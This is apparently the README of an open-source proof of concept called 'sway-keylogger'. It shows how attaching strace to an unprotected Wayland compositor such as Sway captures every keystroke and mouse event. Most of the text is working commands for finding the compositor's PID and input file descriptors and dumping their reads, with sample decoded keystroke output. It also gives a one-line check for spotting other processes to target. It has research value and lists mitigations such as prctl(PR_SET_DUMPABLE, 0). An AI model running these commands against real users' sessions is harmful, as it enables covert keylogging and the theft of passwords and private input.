# sway-keylogger

The purpose of this project is to illustrate how the strace utility
can be used to catch all input events (mouse, keyboards, ...) within
a Wayland session when the compositor is not protected against PTRACE.

The script is currently designed to detect [Sway](https://github.com/swaywm/sway) 
but it should work with other Wayland compositors (specified by their pid) as 
long as they do not protect themselve against PTRACE.

## Requirements

* **[strace](https://strace.io/)** is a diagnostic, debugging and instructional userspace utility for Linux.
* **bash** for the wrapper script over strace. It makes use of regular expressions so any Bash version that is not completely outdated should be fine.
* **pgrep** or **pidof** to find the Sway process (optional)
* a C compiler to compile the small application that decodes the events.
* a Wayland compositor that does not protect itself against ptrace.

## How does it works? 

ptrace is a Linux system call that provides the ability to interact with other processes. It is typically used by debuggers and in that case by the `strace` utility that can dump the system calls of other processes. 

A Wayland compositor typically gets its inputs from the event devices in /dev/input/. For security reasons those devices are normally not accessible by regular users (only root and members of the input group). Wayland compitors are a special case. They typically use libinput in conjunction with libsystemd or liblogind to get access to the input devices for the current session. 

So in practice, that means that during a Wayland session, the compositor is the only process that is supposed to have access to the raw input devices. The compositor is responsible fro dispatching the events to the relevant clients so that each window only sees the event that are relevant.

In our case, strace is attached to the Wayland compositor process and is configured to dump the result of the **read()** system calls from the **/dev/input/event\*** files. 

Here is how that could be done manually.

First, find the pid of the sway process using $SWAYSOCK (or ps, top, pgrep, ...). In that example that is 2125:

    (shell) echo $SWAYSOCK
    /run/user/1000/sway-ipc.1000.2125.sock
    
Second, get the list of input devices on the system. In that case, we are interested by event0 (a keyboard) and event1 (a touchpad).

     (shell) grep . /sys/class/input/event*/device/name 
     /sys/class/input/event0/device/name:AT Translated Set 2 keyboard
     /sys/class/input/event1/device/name:SynPS/2 Synaptics TouchPad
     /sys/class/input/event2/device/name:Power Button
     /sys/class/input/event3/device/name:Sleep Button
     /sys/class/input/event4/device/name:Lid Switch

Second, find which FD (file descriptor) the compositor is using for those inputs. In that case, that is 66 and 67.

    (shell) ls -l /proc/2125/fd/ | grep /dev/input/event
    lrwx------ 1 foobar foobar 64 Mar 29 11:14 66 -> /dev/input/event0
    lrwx------ 1 foobar foobar 64 Mar 29 11:14 67 -> /dev/input/event1
    lrwx------ 1 foobar foobar 64 Mar 29 11:14 68 -> /dev/input/event2
    lrwx------ 1 foobar foobar 64 Mar 29 11:14 69 -> /dev/input/event3
    lrwx------ 1 foobar foobar 64 Mar 29 11:14 70 -> /dev/input/event4

Finally, call strace with the required arguments.

    (shell) strace -s 0 -p 2125 -o /dev/stdout -e trace=read -e read=66,67
    strace: Process 2125 attached
    read(9, ""..., 1024)                    = 32
    read(9, ""..., 1024)                    = 32
    read(9, ""..., 1024)                    = 32
    read(9, ""..., 1024)                    = 32
    read(9, ""..., 1024)                    = 32
    read(67, ""..., 7200)                   = 72
     | 00000  ce ac 00 00 00 00 00 00  7e a7 00 00 00 00 00 00  ........~....... |
     | 00010  04 00 04 00 1c 00 00 00  ce ac 00 00 00 00 00 00  ................ |
     | 00020  7e a7 00 00 00 00 00 00  01 00 1c 00 00 00 00 00  ~............... |
     | 00030  ce ac 00 00 00 00 00 00  7e a7 00 00 00 00 00 00  ........~....... |
     | 00040  00 00 00 00 00 00 00 00                           ........         |
    read(135, 0x55ff88f43670, 7152)         = -1 EAGAIN (Resource temporarily unavailable)
    read(135, 0x55ff88f43658, 7176)         = -1 EAGAIN (Resource temporarily unavailable)
    ...
   
Each hexadecimal dump corresponds to one of more **struct input_event** as defined in [linux/input.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/input.h). The provided C program can take care of decoding that output in a form similar to the **evtest** utility. 

All that can be automated by the provided bash script. 

    (shell) sway-keylogger -p 2125 -f 66,67
    # Using PID=2125
    # strace -s 0 -p 2125 -o /dev/stdout -e trace=read -e read=135,149 | ./sway-keylogger-decoder
    strace: Process 2125 attached
    fd=66 time=44800.390144 type 4 (EV_MSC), code 4 (MSC_SCAN), value 28
    fd=66 time=44800.390144 type 1 (EV_KEY), code 28 (KEY_ENTER), value 0
    fd=66 time=44800.390144 -------------- SYN_REPORT ------------
    fd=66 time=44801.904784 type 4 (EV_MSC), code 4 (MSC_SCAN), value 32
    fd=66 time=44801.904784 type 1 (EV_KEY), code 32 (KEY_D), value 1
    fd=66 time=44801.904784 -------------- SYN_REPORT ------------

## Is that different from [https://github.com/Aishou/wayland-keylogger]?

Yes. That other keylogger intercepts the communications between the compositor and the wayland clients using the LD\_PRELOAD trick and can only be applied to new applications. My approach is different since it directly observes the communications between the compositor and the Linux kernel.

## Is that a security problem?

No because **strace** cannot be used to trace processes of other users (except by root).[ "Securing the compositor against processes running as the current user in the same namespace is not going to work no matter what you do. It's not worth it to try to do it."](https://github.com/swaywm/sway/issues/3987#issuecomment-477603520). 

So, protecting a compositor against a trivial attack is pointless. It is a bit like locking your house which is stupid because burglars can easily break your doors and windows.

## And how can I prevent that trivial attack?

As explained in the previous section, that is really not useful but if you really want to do that: 

* Method 1: Do not use Wayland compositors or critical applications if they allows *ptracing* (e.g. screen lockers, password wallets, ...).

* Method 2: or encapsulate *ALL* your applications in containers with no visibility on the compositor process, remove strace, install a facial recognition device on you machine to detect unexpected users, and just in case disconnect your machine from the Internet. 

* Method 3: or patch the Sway source code by inserting a call to `prctl(PR_SET_DUMPABLE, 0)` at the beginning of the `main` function and also insert `#include <sys/prctl.h>` at the top of the file (see https://github.com/swaywm/sway/issues/3987 ).

## Would that work on my compositor?

There is an easy way to check if the keylogger can operates on any application on your machine. Run the following command as your regular user (not root).

    (shell) ls -l /proc/*/fd/* | grep /dev/input/
    
Any process that exposes some opened files form /dev/input/ is probably a good target. 

## I am using Sway and it does not work.

This is probably because ptrace is disabled either by Sway itself, by the sustem or because Sway was started suid-root.


